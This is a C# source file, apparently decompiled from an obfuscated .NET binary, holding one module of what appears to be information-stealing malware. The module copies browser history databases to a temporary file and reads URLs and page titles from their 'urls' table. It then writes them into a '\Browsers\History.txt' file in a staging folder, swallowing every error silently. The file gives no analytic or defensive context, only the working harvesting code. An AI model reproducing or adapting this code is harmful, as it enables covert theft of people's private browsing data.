using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using ns13;
using ns14;
using ns33;

namespace ns32
{
	// Token: 0x02000033 RID: 51
	internal class Class18
	{
		// Token: 0x060001C8 RID: 456 RVA: 0x0000E760 File Offset: 0x0000C960
		public static void smethod_0()
		{
			string text = "";
			foreach (Class19 @class in Class18.smethod_1())
			{
				text += @class.ToString();
			}
			if (text != "")
			{
				if (!Directory.Exists(GClass9.string_6 + "\\Browsers"))
				{
					Directory.CreateDirectory(GClass9.string_6 + "\\Browsers");
				}
				File.WriteAllText(GClass9.string_6 + "\\Browsers\\History.txt", text, Encoding.Default);
			}
		}

		// Token: 0x060001C9 RID: 457 RVA: 0x0000E814 File Offset: 0x0000CA14
		public static List<Class19> smethod_1()
		{
			List<Class19> list = new List<Class19>();
			string[] string_ = GClass9.string_18;
			for (int i = 0; i < string_.Length; i++)
			{
				List<Class19> list2 = Class18.smethod_2(string_[i]);
				if (list2 != null)
				{
					list.AddRange(list2);
				}
			}
			return list;
		}

		// Token: 0x060001CA RID: 458 RVA: 0x0000E850 File Offset: 0x0000CA50
		private static List<Class19> smethod_2(string string_0)
		{
			List<Class19> result;
			try
			{
				string text = GClass9.string_6 + "test.fv";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(string_0, text, true);
				Class7 @class = new Class7(text);
				List<Class19> list = new List<Class19>();
				@class.method_4("urls");
				for (int i = 0; i < @class.method_1(); i++)
				{
					try
					{
						string a = string.Empty;
						try
						{
							a = @class.method_0(i, 5);
						}
						catch
						{
						}
						if (a != "")
						{
							list.Add(new Class19
							{
								String_0 = @class.method_0(i, 1),
								String_1 = @class.method_0(i, 2)
							});
						}
					}
					catch
					{
					}
				}
				File.Delete(text);
				result = list;
			}
			catch
			{
				result = null;
			}
			return result;
		}
	}
}
